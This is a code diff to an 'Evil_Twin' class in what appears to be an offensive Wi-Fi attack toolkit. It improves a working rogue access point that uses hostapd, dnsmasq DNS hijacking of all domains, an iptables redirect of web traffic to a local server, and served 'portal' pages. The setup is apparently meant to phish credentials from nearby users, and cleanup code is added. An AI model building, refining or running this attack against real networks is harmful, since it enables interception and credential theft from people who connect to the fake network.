@@ -2302,7 +2302,7 @@ class Evil_Twin():
                 choice = console.input("\n[bold yellow]Choose portal!: "); choice = int(choice)
     
                 
-                if choice in range(1, max) or choice == max: portal=f"portal_{choice}"; return portal, portals[choice]  
+                if 1 <= choice <= max: portal=f"portal_{choice}"; return portal, portals[choice]  
 
             
             except (KeyError, TypeError) as e: console.print(f"[bold red][-]Error:[bold yellow] {e}")
@@ -2320,18 +2320,18 @@ class Evil_Twin():
         try:
             USER_HOME = Path(os.getenv("SUDO_USER") and f"/home/{os.getenv('SUDO_USER')}") or Path.home()
             BASE_DIR = USER_HOME / "Documents" / "nsm_tools" / "netcracker" 
-        except Exception as e: console.print(e)
-                
-        # SWITCH BACK TO PATH
-        BASE_DIR = Path.home() / "Documents" / "nsm_tools" / "netcracker";  BASE_DIR.mkdir(exist_ok=True, parents=True)
+        except Exception as e: 
+
+            console.print(e)
+            # SWITCH BACK TO PATH
+            BASE_DIR = Path.home() / "Documents" / "nsm_tools" / "netcracker";  BASE_DIR.mkdir(exist_ok=True, parents=True)
+        
         PORTAL_DIR =  BASE_DIR / "portals";                                 PORTAL_DIR.mkdir(exist_ok=True, parents=True)
-        portal_init = PORTAL_DIR / portal; portal_init.mkdir(exist_ok=True, parents=True)
 
 
-        return portal_init, Path(BASE_DIR / "portals")
+        return PORTAL_DIR, Path(BASE_DIR / "portals" / portal)
 
   
-
     @classmethod
     def _configure_ip(cls, iface):
         """This will configure IP for evil twin"""
@@ -2340,7 +2340,6 @@ class Evil_Twin():
         subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
         subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
         console.print(f"[bold green][+] Configured {iface} with IP 10.0.0.1")
-
 
 
     @classmethod
@@ -2353,16 +2352,19 @@ class Evil_Twin():
             data_hostapd = dedent(
                 f"""
                 interface={iface}
+                driver=nl80211
                 ssid={ssid}
+                hw_mode=g
                 channel={channel}
                 auth_algs={auth_algs}
+                ignore_broadcast_ssid=0
                 """
             ).strip(); what = "hostapd_config"
 
             path = str(path / "hostapd.conf")
 
             with open(path, "w") as file: file.write(data_hostapd)
-            if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what}")
+            if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
             return path
         
 
@@ -2379,6 +2381,8 @@ class Evil_Twin():
             data_dnsmasq = dedent(
                 f"""
                 interface={iface}
+                listen-address=10.0.0.1
+                bind-interfaces
                 dhcp-range={dhcp_range}
                 address=/#/{address}
                 """
@@ -2386,7 +2390,7 @@ class Evil_Twin():
             
             path = str(path / "dnsmasq.conf")
             with open(path, "w") as file: file.write(data_dnsmasq)
-            if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what}")
+            if verbose: console.print(f"[bold green][+] Successfully created:[bold yellow] {what} - {path}")
             return path
         
 
@@ -2406,6 +2410,49 @@ class Evil_Twin():
 
         hostpad_proc
         if verbose: console.print(f"[bold green][+] Successfully launched:[bold yellow] hostapd")
+    
+
+
+    @classmethod
+    def _launch_dnsmasq_old(cls, path: str, verbose=True):
+        """This will launch dnsmasq using /etc/dnsmasq.d/ so it doesn’t hit permission denied"""
+
+        try:
+            # Ensure the system config dir exists
+            subprocess.run(["sudo", "mkdir", "-p", "/etc/dnsmasq.d"], check=True)
+
+            # Define destination and copy config
+            system_conf = "/etc/dnsmasq.d/evil_twin.conf"
+            subprocess.run(["sudo", "cp", path, system_conf], check=True)
+
+            if verbose:
+                console.print(f"[bold green][+] Copied dnsmasq config to:[bold yellow] {system_conf}")
+
+            # Launch dnsmasq (system will auto-read /etc/dnsmasq.d/*.conf)
+            dnsmasq_proc = subprocess.Popen(
+                ["sudo", "dnsmasq", "-d"],  # foreground for debugging
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+
+            if verbose:
+                console.print(f"[bold green][+] Successfully launched:[bold yellow] dnsmasq")
+
+            # Allow it to initialize and print any errors
+            out, err = dnsmasq_proc.communicate(timeout=1)
+            if err:
+                console.print(f"[bold red][-] dnsmasq error:\n[bold yellow]{err.decode().strip()}")
+
+            return dnsmasq_proc
+
+        except subprocess.CalledProcessError as e:
+            console.print(f"[bold red][-] Command failed: {e.cmd}\n[bold yellow]{e.stderr}")
+        except subprocess.TimeoutExpired:
+            console.print(f"[bold yellow][!] dnsmasq is running in background.")
+            return dnsmasq_proc
+        except Exception as e:
+            console.print(f"[bold red][-] Failed to launch dnsmasq: [bold yellow]{e}")
+
 
 
     @classmethod
@@ -2422,6 +2469,9 @@ class Evil_Twin():
         dnsmasq_proc
         if verbose: console.print(f"[bold green][+] Successfully launched:[bold yellow] dnsmasq")
 
+        out, err = dnsmasq_proc.communicate(timeout=1)
+        print(err.decode())
+
 
     @classmethod
     def _set_iptables(cls, verbose=True):
@@ -2430,14 +2480,29 @@ class Evil_Twin():
         subprocess.run(
             ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
-             "--to-port", "8080"
+             "--to-port", "8000"
              ]
         )
 
-        if verbose: console.print(f"[bold green][+] Successfully configured iptables")
+        if verbose: console.print(f"[bold green][+] Successfully configured:[bold yellow] iptables")
 
+
+    @classmethod
+    def _terminate_instance(cls, iface):
+        """This will cleanup all changes"""
+
+        subprocess.run(['sudo', 'pkill', 'hostapd'])
+        subprocess.run(['sudo', 'pkill', 'dnsmasq'])
+        subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', iface])
+        subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'])
+        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'])
+        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'])
+        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'])
+        subprocess.run(['sudo', 'iptables', '-F'])
+        console.print("[bold green][+] Interface cleaned up and restored.")
     
-    
+
+
     class _Evil_Server(SimpleHTTPRequestHandler):
         """Sub class of Evil_Twin for HTTP Requesting handling"""
 
@@ -2475,7 +2540,7 @@ class Evil_Twin():
             """This will launch HTTP Server"""
 
 
-            os.chdir(path)
+            os.chdir(str(path))
 
             server = HTTPServer(server_address=(address, port), RequestHandlerClass=Evil_Twin._Evil_Server)
             console.print(f"[bold green][+] Starting Evil_Twin Server on:[bold yellow] http://localhost:{port}")
@@ -2496,7 +2561,7 @@ class Evil_Twin():
             conf_path, path = Evil_Twin._get_portal_path(portal=portal); print('\n')
 
             Evil_Twin._configure_ip(iface=iface)
-            Background_Threads.channel_hopper(set_channel=6)
+            #Background_Threads.channel_hopper(set_channel=6)
 
 
             h = Evil_Twin._make_hostapd_conf(path=conf_path, iface=iface, ssid=ssid)
@@ -2504,11 +2569,17 @@ class Evil_Twin():
             Evil_Twin._launch_hostapd(path=h)
             Evil_Twin._launch_dnsmasq(path=d)
 
+            Evil_Twin._set_iptables()
+
             Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)
         
-        except KeyboardInterrupt: console.input("[bold red]\n\nPress enter to exit: ")
+        except KeyboardInterrupt: 
+            Evil_Twin._terminate_instance(iface=iface)
+            console.input("[bold red]\n\nPress enter to exit: ")
         
-        except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+        except Exception as e: 
+            Evil_Twin._terminate_instance(iface=iface)
+            console.print(f"[bold red]Exception Error:[bold yellow] {e}")
 
 
         """
